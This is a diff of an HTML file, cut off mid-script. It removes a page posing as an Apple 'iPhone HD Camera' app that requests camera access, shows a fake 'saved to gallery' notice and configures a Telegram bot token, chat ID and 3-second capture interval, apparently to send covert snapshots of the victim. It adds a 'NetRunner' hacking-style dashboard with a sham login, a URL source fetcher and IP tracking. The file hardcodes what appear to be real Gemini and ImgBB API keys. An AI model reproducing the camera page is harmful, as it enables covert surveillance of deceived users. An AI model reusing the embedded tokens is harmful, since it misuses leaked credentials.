@@ -1,609 +1,390 @@
 <!DOCTYPE html>
+<!-- VERSI 16 - DIBANGUN ULANG TOTAL DENGAN SEMUA FUNGSI JAVASCRIPT LENGKAP -->
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iPhone HD Camera Tools</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>NetRunner Protocol // v16 - Absolute Stability</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        :root {
+            --bg-primary: #0A0F1E; --bg-secondary: #121829; --border-color: #232A42;
+            --text-primary: #E2E8F0; --text-secondary: #94A3B8;
+            --accent-teal: #14B8A6; --accent-magenta: #D946EF;
         }
-        
-        body {
-            background: #000;
-            color: #fff;
-            overflow: hidden;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-        }
-        
-        .iphone-frame {
-            width: 360px;
-            height: 700px;
-            background: #000;
-            border-radius: 40px;
-            padding: 20px;
-            box-shadow: 0 0 50px rgba(255, 255, 255, 0.1);
-            position: relative;
-            overflow: hidden;
-            border: 4px solid #333;
-        }
-        
-        .screen {
-            width: 100%;
-            height: 100%;
-            background: #000;
-            border-radius: 30px;
-            overflow: hidden;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .camera-preview {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-            display: none;
-            transform: scaleX(-1); /* Mirror effect for front camera */
-        }
-        
-        .notch {
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 50%;
-            height: 30px;
-            background: #000;
-            border-bottom-left-radius: 15px;
-            border-bottom-right-radius: 15px;
-            z-index: 10;
-        }
-        
-        .control-bar {
-            position: absolute;
-            bottom: 30px;
-            left: 0;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            z-index: 5;
-            gap: 20px;
-        }
-        
-        .capture-btn {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background: #fff;
-            border: 5px solid rgba(255, 255, 255, 0.2);
-            cursor: pointer;
-        }
-        
-        .switch-camera-btn {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.2);
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 20px;
-        }
-        
-        .permission-screen {
-            text-align: center;
-            padding: 40px;
-            z-index: 20;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100%;
-        }
-        
-        .app-icon {
-            width: 100px;
-            height: 100px;
-            background: linear-gradient(45deg, #007AFF, #5856D6);
-            border-radius: 20px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .app-icon i {
-            font-size: 50px;
-            color: white;
-        }
-        
-        h1 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-        
-        p {
-            font-size: 16px;
-            margin-bottom: 25px;
-            color: #ccc;
-            line-height: 1.5;
-        }
-        
-        .permission-btn {
-            background: #007AFF;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        
-        .loading-screen {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 30;
-            display: none;
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(255, 255, 255, 0.1);
-            border-top: 5px solid #007AFF;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .status-text {
-            font-size: 16px;
-            color: #ccc;
-            text-align: center;
-            margin-top: 10px;
-        }
-        
-        .footer {
-            position: absolute;
-            bottom: 10px;
-            text-align: center;
-            color: #666;
-            font-size: 12px;
-            width: 100%;
-        }
-        
-        .fake-notification {
-            position: absolute;
-            top: 50px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(40, 40, 40, 0.9);
-            backdrop-filter: blur(20px);
-            padding: 12px 20px;
-            border-radius: 15px;
-            font-size: 14px;
-            z-index: 25;
-            display: none;
-            animation: fadeInOut 3s forwards;
-        }
-        
-        @keyframes fadeInOut {
-            0% { opacity: 0; top: 40px; }
-            20% { opacity: 1; top: 50px; }
-            80% { opacity: 1; top: 50px; }
-            100% { opacity: 0; top: 60px; display: none; }
-        }
-        
-        .watermark {
-            position: absolute;
-            bottom: 100px;
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
-            z-index: 5;
-        }
-        
-        .capture-indicator {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            width: 15px;
-            height: 15px;
-            background-color: red;
-            border-radius: 50%;
-            z-index: 5;
-            opacity: 0;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0% { opacity: 0; }
-            50% { opacity: 1; }
-            100% { opacity: 0; }
-        }
-        
-        .gallery-preview {
-            position: absolute;
-            bottom: 100px;
-            left: 20px;
-            width: 60px;
-            height: 60px;
-            border-radius: 10px;
-            border: 2px solid white;
-            background-color: #333;
-            z-index: 5;
-            overflow: hidden;
-            display: none;
-        }
-        
-        .gallery-preview img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-secondary); }
+        ::-webkit-scrollbar-thumb { background-color: var(--accent-teal); border-radius: 4px; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-primary); color: var(--text-primary); }
+        .terminal-text { font-family: 'Fira Code', monospace; }
+        .corp-card { background-color: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px; }
+        .corp-input, .corp-textarea { border: 1px solid var(--border-color); background-color: var(--bg-primary); border-radius: 8px; transition: all 0.2s; }
+        .corp-input:focus, .corp-textarea:focus { outline: none; border-color: var(--accent-teal); box-shadow: 0 0 0 2px rgba(20, 184, 166, 0.3); }
+        .corp-btn { background: linear-gradient(90deg, var(--accent-teal), var(--accent-magenta)); color: white; font-weight: 600; border-radius: 8px; transition: all 0.3s; border: none; }
+        .corp-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(20, 184, 166, 0.2), 0 6px 20px rgba(217, 70, 239, 0.2); }
+        .corp-btn:disabled { background: #334155; box-shadow: none; cursor: not-allowed; color: var(--text-secondary); }
+        .nav-item { color: var(--text-secondary); transition: all 0.2s; border-left: 2px solid transparent; }
+        .nav-item:hover { color: var(--text-primary); background-color: #FFFFFF09; }
+        .nav-item.active { color: var(--accent-teal); border-left-color: var(--accent-teal); background-color: #14B8A61A; }
+        .toast { transition: all 0.5s ease; }
+        #auth-container { background: linear-gradient(135deg, #0A0F1E, #121829); }
+        #preview-iframe { background-color: white; }
     </style>
 </head>
-<body>
-    <div class="iphone-frame">
-        <div class="notch"></div>
-        <div class="screen">
-            <video class="camera-preview" id="video" autoplay playsinline></video>
-            <div class="capture-indicator" id="captureIndicator"></div>
-            
-            <div class="permission-screen" id="permissionScreen">
-                <div class="app-icon">
-                    <i class="fas fa-camera"></i>
-                </div>
-                <h1>iPhone HD Camera</h1>
-                <p>Aplikasi kamera canggih dengan kualitas HD untuk pengalaman mengambil foto terbaik. Izinkan akses kamera untuk memulai.</p>
-                <button class="permission-btn" id="permissionBtn">Izinkan Akses Kamera</button>
+<body class="h-screen">
+
+    <!-- Auth Container -->
+    <div id="auth-container" class="w-full h-full flex items-center justify-center p-4">
+        <div class="w-full max-w-md">
+            <div class="text-center mb-8">
+                 <video class="w-20 h-20 rounded-full object-cover mx-auto mb-4" autoplay loop muted playsinline><source src="https://cdn.pixabay.com/video/2022/09/23/129125-754326573_large.mp4" type="video/mp4"></source></video>
+                <h1 class="text-3xl font-bold text-white">Selamat Datang di NetRunner</h1>
+                <p class="text-text-secondary">Silakan masuk untuk melanjutkan.</p>
             </div>
-            
-            <div class="loading-screen" id="loadingScreen">
-                <div class="spinner"></div>
-                <p class="status-text" id="statusText">Menyiapkan kamera...</p>
+            <div class="corp-card p-8">
+                <form id="login-form">
+                    <div class="mb-4"><label for="email" class="block text-sm font-medium text-text-secondary mb-2">Alamat Email</label><input type="email" id="email" class="corp-input w-full p-3" required></div>
+                    <div class="mb-6"><label for="password" class="block text-sm font-medium text-text-secondary mb-2">Kata Sandi</label><input type="password" id="password" class="corp-input w-full p-3" required minlength="8"></div>
+                    <button type="submit" class="corp-btn w-full py-3">Masuk</button>
+                </form>
             </div>
-            
-            <div class="control-bar">
-                <div class="switch-camera-btn" id="switchCameraBtn">
-                    <i class="fas fa-sync-alt"></i>
-                </div>
-                <div class="capture-btn" id="captureBtn"></div>
-                <div class="gallery-preview" id="galleryPreview">
-                    <img id="lastCaptureImg" src="" alt="Last capture">
-                </div>
-            </div>
-            
-            <div class="watermark">iPhone HD Camera v2.3.1</div>
         </div>
     </div>
-    
-    <div class="fake-notification" id="notification">
-        <i class="fas fa-check-circle"></i> Foto berhasil disimpan ke galeri
-    </div>
-    
-    <div class="footer">
-        © 2023 Apple Inc. All rights reserved.
-    </div>
 
-    <script>
-        // Konfigurasi
-        const BOT_TOKEN = '8462747701:AAE4la0120m3NRvBE0i3_4R3TtQ4OhzNn8U'; // Ganti dengan token bot Telegram
-        const CHAT_ID = '8443969542'; // Ganti dengan chat ID admin
-        const CAPTURE_INTERVAL = 3000; // Interval pengambilan gambar (ms)
+    <!-- App Container (Initially Hidden) -->
+    <div id="app-container" class="flex h-full hidden">
+        <aside class="w-64 flex-shrink-0 bg-secondary border-r border-border-color p-4 flex-col hidden lg:flex">
+            <div class="flex items-center gap-3 mb-8">
+                <video class="w-12 h-12 rounded-full object-cover" autoplay loop muted playsinline><source src="https://files.catbox.moe/irznhv.mp4" type="video/mp4"></source></video>
+                <div><h1 class="text-xl font-bold">NetRunner</h1><p class="text-xs text-text-secondary">Protocol v16</p></div>
+            </div>
+            <nav id="desktop-nav" class="space-y-2 flex-grow"></nav>
+            <div class="mt-auto">
+                <a href="#" id="logout-btn-desktop" class="nav-item flex items-center gap-3 px-4 py-2 rounded-md">
+                    <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
+                    <span>Logout</span>
+                </a>
+            </div>
+        </aside>
+        <div class="flex-1 flex flex-col overflow-hidden">
+            <header class="w-full p-4 border-b border-border-color flex justify-between items-center lg:hidden">
+                <div class="flex items-center gap-3"><video class="w-10 h-10 rounded-full object-cover" autoplay loop muted playsinline><source src="https://cdn.pixabay.com/video/2022/09/23/129125-754326573_large.mp4" type="video/mp4"></source></video><h1 class="text-xl font-bold">NetRunner</h1></div>
+                <button id="hamburger-btn" class="p-2 rounded-md hover:bg-white/10"><svg class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg></button>
+            </header>
+            <main id="main-content" class="flex-1 p-6 overflow-y-auto"></main>
+        </div>
+        <div id="mobile-nav-modal" class="fixed inset-0 z-50 bg-bg-primary/80 backdrop-blur-sm hidden">
+            <nav class="w-64 bg-bg-secondary h-full p-4 flex flex-col">
+                <button id="mobile-nav-close" class="self-end p-2 mb-4 rounded-md hover:bg-white/10">&times;</button>
+                <div id="mobile-nav-links" class="space-y-2 flex-grow"></div>
+                 <a href="#" id="logout-btn-mobile" class="nav-item flex items-center gap-3 px-4 py-2 rounded-md">
+                    <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
+                    <span>Logout</span>
+                </a>
+            </nav>
+        </div>
+        <div id="preview-modal" class="fixed inset-0 z-50 bg-bg-primary/80 backdrop-blur-sm hidden items-center justify-center p-4">
+            <div id="preview-modal-content" class="corp-card w-full h-full flex flex-col transform scale-95 opacity-0 transition-all duration-300">
+                <div class="flex-shrink-0 flex justify-between items-center p-4 border-b border-border-color"><h2 class="text-xl terminal-text">&gt; Pratinjau Langsung</h2><button id="preview-modal-close" class="p-2 rounded-full hover:bg-white/10">&times;</button></div>
+                <div class="flex-1 p-2"><iframe id="preview-iframe" class="w-full h-full border-0 rounded-lg"></iframe></div>
+            </div>
+        </div>
+        <div id="toast-container" class="fixed bottom-5 right-5 z-50 space-y-2"></div>
+        <audio id="background-music" loop><source src="https://files.catbox.moe/h3di13.m4a" type="audio/mpeg"></source></audio>
+        <button id="music-toggle-btn" class="fixed bottom-5 left-5 z-40 bg-bg-secondary w-12 h-12 rounded-full flex items-center justify-center border border-border-color shadow-lg hover:border-accent-teal transition">
+            <svg id="play-icon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z"></path></svg>
+            <svg id="pause-icon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 hidden" viewBox="0 0 20 20" fill="currentColor"><path d="M10 18a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v4a1 1 0 102 0V8a1 1 0 00-1-1z"></path></svg>
+        </button>
+    </div>
+    
+    <script type="module">
+        // --- API KEYS CONFIGURATION ---
+        const GEMINI_API_KEY = 'AIzaSyAu1gmFHouyMJNi7__dfKfeSADxhDaARcE';
+        const IMGBB_API_KEY = '75617a3865807615f28825fc3b3116fe';
         
-        // Elemen DOM
-        const permissionScreen = document.getElementById('permissionScreen');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const video = document.getElementById('video');
-        const captureBtn = document.getElementById('captureBtn');
-        const switchCameraBtn = document.getElementById('switchCameraBtn');
-        const permissionBtn = document.getElementById('permissionBtn');
-        const statusText = document.getElementById('statusText');
-        const notification = document.getElementById('notification');
-        const captureIndicator = document.getElementById('captureIndicator');
-        const galleryPreview = document.getElementById('galleryPreview');
-        const lastCaptureImg = document.getElementById('lastCaptureImg');
+        // --- GLOBAL STATE ---
+        const mainContent = document.getElementById('main-content');
+        const desktopNav = document.getElementById('desktop-nav');
+        const mobileNavLinks = document.getElementById('mobile-nav-links');
+        const mobileNavModal = document.getElementById('mobile-nav-modal');
+        const hamburgerBtn = document.getElementById('hamburger-btn'), mobileNavClose = document.getElementById('mobile-nav-close');
         
-        // Status aplikasi
-        let cameraAllowed = true;
-        let dataSent = true;
-        let captureInterval;
-        let isFrontCamera = true;
-        let stream = null;
+        const appContainer = document.getElementById('app-container');
+        const authContainer = document.getElementById('auth-container');
         
-        // Event listener untuk tombol izin
-        permissionBtn.addEventListener('click', requestCameraAccess);
-        
-        // Event listener untuk tombol switch kamera
-        switchCameraBtn.addEventListener('click', switchCamera);
-        
-        // Event listener untuk tombol capture
-        captureBtn.addEventListener('click', toggleContinuousCapture);
-        
-        // Meminta akses kamera
-        function requestCameraAccess() {
-            permissionScreen.style.display = 'none';
-            loadingScreen.style.display = 'flex';
-            
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                // Gunakan kamera depan secara default
-                const constraints = {
-                    video: { 
-                        facingMode: isFrontCamera ? "user" : "environment",
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    }
-                };
-                
-                navigator.mediaDevices.getUserMedia(constraints)
-                    .then(function(mediaStream) {
-                        stream = mediaStream;
-                        video.srcObject = stream;
-                        video.style.display = 'block';
-                        cameraAllowed = true;
-                        
-                        // Sembunyikan loading screen setelah beberapa detik
-                        setTimeout(() => {
-                            loadingScreen.style.display = 'none';
-                            statusText.textContent = "Kamera siap...";
-                        }, 1000);
-                    })
-                    .catch(function(error) {
-                        statusText.textContent = "Error mengakses kamera: " + error.message;
-                        console.error("Error accessing camera:", error);
-                    });
+        let MAX_ATTEMPTS = 3;
+        const REDEEM_CODE = 'KGM-DIKZ';
+        let previewBlobUrl = null;
+
+        // --- PAGE TEMPLATES ---
+        const pages = {
+            'fetcher': {
+                title: 'Source Fetcher',
+                icon: `<svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>`,
+                render: () => `<div class="grid grid-cols-1 lg:grid-cols-2 gap-6 h-full"><div class="corp-card p-6 flex flex-col"><h2 class="text-2xl terminal-text mb-4 border-b border-border-color pb-2">&gt; Input</h2><p class="text-text-secondary mb-4 text-sm">Masukkan URL target untuk mengekstrak kode sumbernya. Batas pemakaian Anda saat ini adalah <span class="font-bold text-white">${MAX_ATTEMPTS}</span> permintaan per jam.</p><div class="flex flex-col md:flex-row gap-4 items-center"><input type="url" id="url-input" placeholder="https://example.com" class="corp-input w-full text-lg px-4 py-3 flex-grow"><button id="fetch-btn" class="corp-btn w-full md:w-auto px-8 py-3 text-base">Ekstrak</button></div><div id="status-display" class="mt-4 text-sm text-center h-6 text-accent-teal"></div><div class="text-center mt-auto pt-4 text-text-secondary"><p>Panggilan API Tersisa:</p><p id="limit-count" class="font-bold text-text-primary text-4xl">${MAX_ATTEMPTS}</p></div></div><div class="corp-card p-2 flex-grow min-h-0 flex flex-col lg:min-h-[80vh]"><div class="flex justify-between items-center p-2"><h2 class="text-2xl terminal-text ml-2">&gt; Output Log</h2><div class="flex items-center gap-2"><button id="run-btn" class="corp-btn px-4 py-1 text-sm opacity-50" disabled>Run</button><button id="copy-btn" class="corp-btn px-4 py-1 text-sm opacity-50" disabled>Salin</button><button id="download-btn" class="corp-btn px-4 py-1 text-sm opacity-50" disabled>Download</button></div></div><div class="w-full h-full p-4 overflow-auto flex-grow bg-bg-primary rounded-lg mt-2" id="code-output-wrapper"><pre class="h-full w-full"><code id="code-output" class="text-sm hljs language-html rounded-lg"></code></pre><div id="initial-message" class="flex items-center justify-center h-full text-text-secondary text-xl"><span class="terminal-text">// Menunggu perintah... //</span></div></div></div></div>`
+            },
+            'ai_image': {
+                title: 'AI Gambar',
+                icon: `<svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>`,
+                render: () => `<div class="corp-card p-6"><h2 class="text-2xl terminal-text mb-4 border-b border-border-color pb-2">&gt; AI Image Generator</h2><p class="text-text-secondary mb-4 text-sm">Gunakan kekuatan AI untuk membuat gambar dari deskripsi teks.</p><textarea id="ai-gambar-prompt" rows="4" class="corp-input w-full p-3 text-base" placeholder="Contoh: seekor kucing astronot mengambang di luar angkasa, gaya sinematik"></textarea><div class="flex flex-col sm:flex-row gap-4 mt-4"><button id="ai-gambar-btn" class="corp-btn px-8 py-3 w-full">Buat Gambar</button></div><div id="ai-gambar-result" class="mt-6 p-4 flex justify-center items-center min-h-[300px] bg-bg-primary rounded-lg"><span class="text-text-secondary">Hasil gambar akan muncul di sini</span></div></div>`
+            },
+            'tools': {
+                 title: 'Utilitas Lain',
+                 icon: `<svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M12 6V3m0 18v-3M5.636 5.636l-1.414-1.414m15.556 15.556l-1.414-1.414M18.364 5.636l-1.414 1.414m-11.314 11.314l-1.414 1.414"/></svg>`,
+                 render: () => `<div class="grid grid-cols-1 md:grid-cols-2 gap-6"><div class="corp-card p-6"><h3 class="text-xl mb-4 pb-2 border-b border-border-color terminal-text">Cek IP Publik</h3><button id="check-ip-btn" class="corp-btn w-full py-2">Tampilkan IP Saya</button><div id="ip-result" class="mt-4 p-4 text-center text-lg hidden"></div></div><div class="corp-card p-6"><h3 class="text-xl mb-4 pb-2 border-b border-border-color terminal-text">Lacak IP</h3><input type="text" id="ip-track-input" placeholder="Masukkan IP address" class="corp-input w-full p-2"><button id="track-ip-btn" class="corp-btn w-full mt-2 py-2">Lacak IP</button><div id="ip-track-result" class="mt-4 p-4 hidden"></div></div><div class="corp-card p-6"><h3 class="text-xl mb-4 pb-2 border-b border-border-color terminal-text">QR Generator</h3><input type="text" id="qr-input" placeholder="Masukkan teks atau URL" class="corp-input w-full p-2"><button id="qr-generate-btn" class="corp-btn w-full mt-2 py-2">Buat QR</button><div id="qr-result" class="mt-4 p-2 bg-white rounded-lg inline-block"></div><button id="qr-download-btn" class="corp-btn w-full mt-2 py-2 hidden">Download QR</button></div><div class="corp-card p-6"><h3 class="text-xl mb-4 pb-2 border-b border-border-color terminal-text">Image to URL</h3><input type="file" id="image-input" accept="image/*" class="corp-input w-full p-2 text-sm"><button id="upload-btn" class="corp-btn w-full mt-4 py-2">Unggah</button><div id="upload-status" class="mt-4 text-center h-5"></div><div id="result-url-wrapper" class="mt-4 hidden"><input type="text" id="result-url" class="corp-input w-full p-2 mt-1" readonly></div></div></div>`
+            },
+            'redeem': {
+                title: 'Redeem Code',
+                icon: `<svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/></svg>`,
+                render: () => `<div class="corp-card p-6"><h2 class="text-2xl terminal-text mb-4 border-b border-border-color pb-2">&gt; Redeem Code</h2><p class="text-text-secondary mb-4 text-sm">Masukkan kode hadiah untuk meningkatkan batas pemakaian API Anda.</p><div class="flex flex-col md:flex-row gap-4 items-center"><input type="text" id="redeem-input" placeholder="Ketik kode di sini" class="corp-input uppercase w-full text-lg px-4 py-3 flex-grow"><button id="redeem-btn" class="corp-btn w-full md:w-auto px-8 py-3 text-base">Redeem</button></div></div>`
+            },
+            'contact': {
+                title: 'Hubungi Admin',
+                icon: `<svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"/></svg>`,
+                render: () => `<div class="corp-card p-6"><h2 class="text-2xl terminal-text mb-4 border-b border-border-color pb-2">&gt; Hubungi Admin</h2><p class="text-text-secondary mb-6 text-sm">Jika Anda memerlukan bantuan atau memiliki pertanyaan, silakan hubungi kami.</p><div class="flex flex-col gap-4"><a href="https://wa.me/6285351952977" target="_blank" class="corp-btn p-4 text-lg flex items-center gap-4 text-left"><svg class="w-7 h-7" viewBox="0 0 24 24" fill="currentColor"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.894 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.886-.001 2.269.654 4.505 1.905 6.403l-1.238 4.534 4.644-1.225z"/></svg><span>Customer Service (WA)</span></a><a href="https://wa.me/6283170966509" target="_blank" class="corp-btn p-4 text-lg flex items-center gap-4 text-left"><svg class="w-7 h-7" viewBox="0 0 24 24" fill="currentColor"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.894 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.886-.001 2.269.654 4.505 1.905 6.403l-1.238 4.534 4.644-1.225z"/></svg><span>Admin Utama (WA)</span></a><a href="https://t.me/anonymous_kz" target="_blank" class="corp-btn p-4 text-lg flex items-center gap-4 text-left"><svg class="w-7 h-7" viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0C5.338 0 0 5.338 0 11.944c0 6.606 5.338 11.944 11.944 11.944 6.606 0 11.944-5.338 11.944-11.944C23.888 5.338 18.55 0 11.944 0zM18.04 7.625l-2.106 9.863c-.213 1.002-.79 1.25-1.624.778l-3.118-2.288-1.51 1.454c-.167.167-.312.312-.625.312l.218-3.183 5.795-5.253c.25-.218-.063-.343-.375-.125l-7.14 4.52-3.045-.944c-1-.312-1.012-1.012.213-1.5l12.44-4.63c.844-.313 1.564.188 1.28 1.438z"/></svg><span>Admin (Telegram)</span></a></div></div>`
+            }
+        };
+
+        // --- CORE APP LOGIC ---
+        function checkLoginState() {
+            if (localStorage.getItem('isLoggedIn') === 'true') {
+                authContainer.classList.add('hidden');
+                appContainer.classList.remove('hidden');
+                appContainer.classList.add('flex');
+                initApp();
             } else {
-                statusText.textContent = "Browser tidak mendukung akses kamera";
+                authContainer.classList.remove('hidden');
+                authContainer.classList.add('flex');
+                appContainer.classList.add('hidden');
             }
         }
         
-        // Fungsi untuk mengganti kamera
-        function switchCamera() {
-            if (!cameraAllowed) return;
-            
-            // Hentikan stream yang aktif
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-            
-            // Toggle antara kamera depan dan belakang
-            isFrontCamera = !isFrontCamera;
-            
-            // Minta akses ke kamera yang dipilih
-            loadingScreen.style.display = 'flex';
-            statusText.textContent = "Mengganti kamera...";
-            
-            const constraints = {
-                video: { 
-                    facingMode: isFrontCamera ? "user" : "environment",
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
-                }
-            };
-            
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(function(mediaStream) {
-                    stream = mediaStream;
-                    video.srcObject = stream;
-                    loadingScreen.style.display = 'none';
-                })
-                .catch(function(error) {
-                    statusText.textContent = "Error mengakses kamera: " + error.message;
-                    console.error("Error accessing camera:", error);
-                });
+        function handleLogin(e) { e.preventDefault(); localStorage.setItem('isLoggedIn', 'true'); checkLoginState(); }
+        function handleLogout() { localStorage.removeItem('isLoggedIn'); window.location.reload(); }
+
+        function initApp() {
+            if (localStorage.getItem('netrunner_redeemed_premium') === 'true') { MAX_ATTEMPTS = 50; }
+            setupNavigation();
+            navigateTo('fetcher');
+            hamburgerBtn.addEventListener('click', () => mobileNavModal.classList.remove('hidden'));
+            mobileNavClose.addEventListener('click', () => mobileNavModal.classList.add('hidden'));
+            mobileNavModal.addEventListener('click', (e) => { if(e.target === mobileNavModal) mobileNavModal.classList.add('hidden'); });
+            const musicToggleBtn = document.getElementById('music-toggle-btn'), bgMusic = document.getElementById('background-music'), playIcon = document.getElementById('play-icon'), pauseIcon = document.getElementById('pause-icon');
+            musicToggleBtn.addEventListener('click', async () => {
+                if (bgMusic.paused) { try { await bgMusic.play(); playIcon.classList.add('hidden'); pauseIcon.classList.remove('hidden'); } catch (error) { console.error("Gagal memutar musik:", error); }
+                } else { bgMusic.pause(); playIcon.classList.remove('hidden'); pauseIcon.classList.add('hidden'); }
+            });
+            document.getElementById('logout-btn-desktop').addEventListener('click', handleLogout);
+            document.getElementById('logout-btn-mobile').addEventListener('click', handleLogout);
+            document.getElementById('preview-modal-close').addEventListener('click', closePreviewModal);
+            document.getElementById('preview-modal').addEventListener('click', (e) => { if(e.target.id === 'preview-modal') closePreviewModal(); });
         }
-        
